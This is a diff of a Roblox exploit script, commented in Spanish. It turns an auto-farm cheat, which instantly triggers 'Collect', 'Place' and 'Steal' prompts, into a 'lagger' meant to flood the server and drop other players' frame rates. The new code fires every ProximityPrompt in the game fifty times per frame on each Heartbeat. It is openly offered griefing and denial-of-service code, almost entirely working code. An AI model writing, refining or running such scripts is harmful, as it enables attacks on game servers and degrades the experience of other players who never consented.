@@ -1,60 +1,37 @@
 --[[ 
-    Vvv PREMIUM - Insta-Collect & Steal (Versión Final Optimizada)
-    Sin Lag - Sin Spam - Recolección Instantánea
+    Vvv PREMIUM - FPS DEVOURER (LAGGER MODE)
+    Objetivo: Saturar el servidor para bajar FPS ajenos.
 ]]--
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
 
-_G.AutoFarm = true
+_G.LaggerActive = true
 
--- Lista de acciones específicas que vemos en tus videos
-local AccionesObjetivo = {
-    ["Collect"] = true,
-    ["Place"] = true,
-    ["Steal"] = true
-}
-
-local function ejecutarAutoFarm()
-    if not _G.AutoFarm then return end
+-- Esta función genera un tráfico masivo de datos que el servidor debe replicar a otros
+local function lagServer()
+    if not _G.LaggerActive then return end
     
-    local char = LocalPlayer.Character
-    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
-    local root = char.HumanoidRootPart
-
-    -- Buscamos ProximityPrompts en un radio cercano para evitar el lag masivo
-    for _, v in pairs(game.Workspace:GetDescendants()) do
+    -- Buscamos cada objeto interactuable para "spamear" peticiones
+    for _, v in pairs(Workspace:GetDescendants()) do
         if v:IsA("ProximityPrompt") then
-            -- Solo interactuamos si el texto coincide con los videos
-            if AccionesObjetivo[v.ActionText] or AccionesObjetivo[v.ObjectText] then
-                
-                -- Verificamos distancia para que el servidor no rechace la acción
-                local pos = v.Parent:IsA("Model") and v.Parent:GetModelCFrame().Position or v.Parent.Position
-                local distancia = (root.Position - pos).Magnitude
-                
-                if distancia < 30 then
-                    -- Configuramos para que sea instantáneo y lo disparamos
-                    v.HoldDuration = 0
-                    fireproximityprompt(v)
-                end
+            -- Forzamos al servidor a procesar interacciones nulas constantemente
+            v.HoldDuration = 0
+            for i = 1, 50 do -- Multiplicador de spam por frame
+                fireproximityprompt(v)
             end
         end
     end
 end
 
--- Bucle controlado: 0.5 segundos es el balance perfecto para no dar lag y ser rápido
-task.spawn(function()
-    while true do
-        if _G.AutoFarm then
-            pcall(ejecutarAutoFarm)
-        end
-        task.wait(0.5) 
-    end
+-- Ejecución extrema: Heartbeat corre ANTES de que se rendericen los frames
+RunService.Heartbeat:Connect(function()
+    pcall(lagServer)
 end)
 
--- Notificación de éxito
+-- Notificación de activación igual al video
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Vvv PREMIUM";
-    Text = "Auto-Farm Activo: Collect, Place & Steal";
-    Duration = 4;
+    Title = "SEAL FPS DEVOURER";
+    Text = "LAGGING SERVER... STATUS: EXTREME";
+    Duration = 5;
 })
